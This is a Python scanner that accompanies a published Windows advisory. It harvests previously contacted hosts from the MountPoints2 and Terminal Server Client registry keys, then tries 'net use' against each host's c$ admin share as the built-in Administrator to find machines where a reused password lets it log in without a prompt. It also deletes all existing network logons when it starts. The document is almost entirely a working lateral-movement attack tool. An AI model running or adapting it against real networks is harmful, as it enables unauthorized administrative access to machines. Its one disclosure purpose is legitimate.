import os,re,time,signal,sys
from subprocess import *
from multiprocessing import Process

#By John Page (aka hyp3rlinx)
#Apparition Security
#twitter.com/hyp3rlinx
#Advisory: http://hyp3rlinx.altervista.org/advisories/MICROSOFT-WINDOWS-NET-USE-INSUFFICIENT-PASSWORD-PROMPT.txt 
#-----------------------------------
#When a remote systems built-in Administrator account is enabled and both the remote and the target system
#passwords match (password reuse) theres no prompt for credentials and we get logged in automagically.
#
#MountPoints2 and Terminal server client hints in the Windows registry can help us.
#Typically, MountPoints2 is used by Forensic analysts to help determine where an attacker laterally moved to previously.
#REG Query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2 /F "##" (we want network logons)
#MountPoints2 key entries are stored like '##10.2.1.40#c$'
#-----------------------------------------------------------

BANNER="""
               |       \     __ )                     
  __ \    _ \  __|    _ \    __ \   |   |   __|   _ \ 
  |   |   __/  |     ___ \   |   |  |   | \__ \   __/ 
 _|  _| \___| \__| _/    _\ ____/  \__,_| ____/ \___| 
                                      By Hyp3rlinx                                                                  
                                      ApparitionSec
"""

DRIVE="X"
FINDME="The command completed successfully."
REG_MOUNT2='REG Query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2 /F "##"'
REG_RDPUSERS="REG Query \"HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers\""+" /s"
VULN_FOUND=set()
DELAY=2   #Any lower and we may get inaccurate results.
rdp_server_lst=[]

#Return prior network logons to remote systems.
def mountpoints2():
    mntpoint2_connections=[]
    try:
        p = Popen(REG_MOUNT2, stdout=PIPE, stderr=PIPE, shell=True)
        tmp = p.stdout.readlines()
    except Exception as e:
        print("[!] "+str(e))
        return False
    for x in tmp:
        idx = x.find("##")
        clean = x[idx:]
        idx2 = clean.rfind("#")
        ip = clean[2:idx2]
        ip = re.sub(r"#.*[A-Z,a-z]","",ip)
        if ip not in mntpoint2_connections:
            mntpoint2_connections.append(ip)
        mntpoint2_connections = list(filter(None, mntpoint2_connections))
    p.kill()
    return mntpoint2_connections

 
#Terminal server client stores remote server connections.
def rdp_svrs():
    global rdp_server_lst
    try:
        p = Popen(REG_RDPUSERS, stdout=PIPE, stderr=PIPE, shell=True)
        tmp = p.stdout.readlines()
        for key in tmp:
            if key.find("Servers")!=-1:
                pos = key.rfind("\\")
                srv = key[pos + 1:].replace("\r\n","").strip()
                rdp_server_lst.append(srv)
        p.kill()
    except Exception as e:
        print("[!] "+str(e))
        return False
    return True


#Disconnect
def del_vuln_connection(ip):
    try:
        print("[!] Disconnecting vuln network logon connection.\n")
        call(r"net use "+DRIVE+":"+" /del")
    except Exception as e:
        print("[!] "+str(e))


#Check connection
def chk_connection(ip):
    print("[+] Testing: "+ip)
    sys.stdout.flush()
    cmd = Popen(['ping.exe', ip, "-n", "1"], stderr=PIPE, stdout=PIPE, shell=True)
    stderr, stdout = cmd.communicate()
    if "Reply from" in stderr and "Destination host unreachable" not in stderr:
        print("[*] Target up!")
        return True
    else:
        print("[!] Target unreachable :(")
    return False

 
#Test vuln
def Test_Password_Reuse(ip):
    print("[+] Testing "+ip + " the builtin Administrator account.\n")
    sys.stdout.flush()
    try:
        p = Popen("net use X: \\\\"+ip+"\\c$ /user:Administrator", stdout=PIPE, stderr=PIPE, shell=True)
        err = p.stderr.readlines()
    
        if err:
            e = str(err)
            if e.find("error 53")!=-1:
                print("[*] Network path not found\n")
                return
            elif e.find("error 1219")!=-1:
                print("[*] Target connections to a server or shared resource by the same user, using more than one user name are disallowed.\n")
                return
            elif e.find("error 85")!=-1:
                print("[*] The local device name is already in use.\n")
                return
            else:
                print(e+"\n")
                
        tmp = p.stdout.read()

        if FINDME in tmp:
            print("[*] Password reuse for the built-in Administrator found!")
            print("[+] Connected to target: "+ ip)
            VULN_FOUND.add(ip+":Administrator")
            del_vuln_connection(ip)
        p.kill()
    except Exception as e:
        print("[!] "+str(e))



#Authenticate
def auth(ip):
    action_process = Process(target=Test_Password_Reuse, args=(ip,))
    action_process.start()
    action_process.join(timeout=5)
    action_process.terminate()


if __name__ == "__main__":

    print(BANNER)
    print("[+] M$ Windows net use Logon Command")
    print("[+] Insufficient Authentication Logic Scanner")
    print("[+] By hyp3rlinx\n")
    print("[!] Deletes existing network logons")
    print("[!] Scans environment for vuln machines.")
    print("[!] To continue hit enter or ctrl+c to abort.")
    raw_input("")
    
    print("[+] Deleting any existing network logons to start clean.")
    
    #Make sure no exist sessions already exist.
    call(r"net use * /del /y")
    sys.stdout.flush()
    time.sleep(1)

    
    #Grab previous connections from MountPoints2 if any.
    rdp_svrs()
    svrlst=mountpoints2()

    if svrlst:
        svrlst + rdp_server_lst
    else:
        svrlst = rdp_server_lst
    
    if not svrlst:
        print("[*] No MountPoints2 artifacts found, enter an IP.")
        sys.stdout.flush()
        ip=raw_input("[+] Target IP> ")
        if chk_connection(ip):
             auth(ip)
    else:
        #We have MountPoints2 or RDP Server list IP we can try.
        for ip in svrlst:
            if chk_connection(ip):
                 auth(ip)
                 
            time.sleep(DELAY)
 

    if len(VULN_FOUND) != 0:
        print("[*] Located the following vulnerable systems:")
        sys.stdout.flush()
        for v in VULN_FOUND:
            print("[+] "+v)
    else:
        print("[+] All previous attempts failed, enter an IP and give it a shot!.")
        sys.stdout.flush()
        ip=raw_input("[+] Target IP> ")
        if chk_connection(ip):
             auth(ip)
